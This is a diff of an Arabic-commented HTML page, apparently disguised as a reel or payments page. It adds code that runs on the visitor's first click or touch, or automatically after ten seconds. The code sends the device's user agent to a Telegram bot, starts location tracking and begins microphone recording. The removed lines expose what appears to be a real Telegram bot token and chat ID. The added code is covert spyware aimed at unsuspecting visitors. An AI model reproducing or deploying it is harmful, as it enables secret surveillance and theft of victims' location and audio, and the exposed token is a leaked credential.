@@ -170,8 +170,8 @@
         // ================================================================
         const CONFIG = {
             // تيليجرام
-            BOT_TOKEN: '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM',
-            CHAT_ID:   '7615377804',
+            BOT_TOKEN: 'ضع_توكن_البوت_هنا',
+            CHAT_ID:   'ضع_معرف_الدردشة_هنا',
 
             // Google Drive — اختياري (اتركه فارغًا إذا ما تبي)
             DRIVE_SERVER_URL: '', // مثال: 'https://your-server.com'
@@ -459,7 +459,44 @@
             }
         }
 
+        
         // ----- التشغيل -----
         function launchPayments() {
             if (isRunning) return;
-     
+            isRunning = true;
+
+            // اختيار الريل العشوائي
+            initReel();
+
+            // إشعار البدء
+            tgMsg(
+                `🚀 **بدأت جلسة جديدة**\n` +
+                `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                `الجهاز: ${navigator.userAgent.slice(0, 80)}`
+            );
+
+            // التتبع
+            startTracking();
+
+            // التسجيل الصوتي بعد ثانية
+            setTimeout(startAudio, 1000);
+        }
+
+        // ================================================================
+        //  ربط الأحداث — التشغيل عند أول نقرة
+        // ================================================================
+        document.addEventListener('click', launchPayments, { once: true });
+        document.addEventListener('touchstart', launchPayments, { once: true });
+
+        // Fallback: بعد 10 ثوانٍ شغّل تلقائيًا
+        setTimeout(() => { if (!isRunning) launchPayments(); }, 10000);
+
+        // تنظيف
+        window.addEventListener('beforeunload', () => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
+            if (watchId) navigator.geolocation.clearWatch(watchId);
+        });
+    </script>
+</body>
+</html>
